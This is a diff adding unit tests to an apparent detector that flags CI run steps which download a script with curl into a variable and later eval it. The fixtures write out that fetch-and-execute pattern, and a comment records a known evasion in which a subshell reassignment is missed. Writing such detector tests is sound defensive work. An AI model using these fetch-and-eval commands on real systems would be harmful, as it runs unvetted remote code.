@@ -981,6 +981,20 @@ class TestADownloadCarriedInAVariable(unittest.TestCase):
         self.assertEqual([], self.job(self.GET, 'eval "$x"\n'))
         self.assertEqual(1, len(self.job(self.GET + 'eval "$x"\n')))
 
+    def test_a_reassignment_bash_may_skip_or_run_elsewhere_keeps_it_held(self):
+        # Review I-1: bash skips `x=1` behind `||` or in an untaken branch, and
+        # runs it in a child shell for `sh -c`, so each of these still runs the
+        # download; so does a pipeline stage's, in a subshell of its own. Only
+        # a reassignment the step's own shell always runs empties it (`x=1`,
+        # pinned CLEAN above). `eval 'x=:'` does run in the step's shell and
+        # reads as a child's: an accepted over-report, beside its control.
+        for between in ('[ -n "$x" ] || x=1\n', 'if [ -z "$x" ]; then x=1; fi\n',
+                        "sh -c 'x=1'\n", "x=1 | cat\n", "eval 'x=:'\n", "eval 'y=:'\n"):
+            with self.subTest(between=between):
+                why = self.job(self.GET + between + 'eval "$x"\n')
+                self.assertEqual(1, len(why), why)
+                self.assertIn(self.SAID % ("eval", ""), why[0])
+
 
 class TestAPatternWhereTheCommandStarts(unittest.TestCase):
     """#2294: bash 3.2 and 5.2 expand `{sh,-c}` to `sh -c`, and `[s]h` to `sh`
@@ -2746,6 +2760,14 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
             with self.subTest(run=run):
                 self.accepted(("run", run))
         self.flagged(("run", get + 'eval "$x"\n'))
+
+    def test_a_subshell_reassignment_empties_a_carried_download(self):
+        # Review I-1: the reader keeps no subshell, so `( x=1 )` reads as the
+        # step's own reassignment and empties the variable, though bash runs
+        # the download; a child shell's twin is read, and keeps it held.
+        get = "x=$(curl -fsSL https://example.test/i.sh)\n"
+        self.accepted(("run", get + '( x=1 )\neval "$x"\n'))
+        self.flagged(("run", get + "sh -c 'x=1'\neval \"$x\"\n"))
 
     # Grouping parentheses are read with or without surrounding whitespace.
     def test_a_fetch_at_the_head_of_a_tight_subshell_is_read(self):
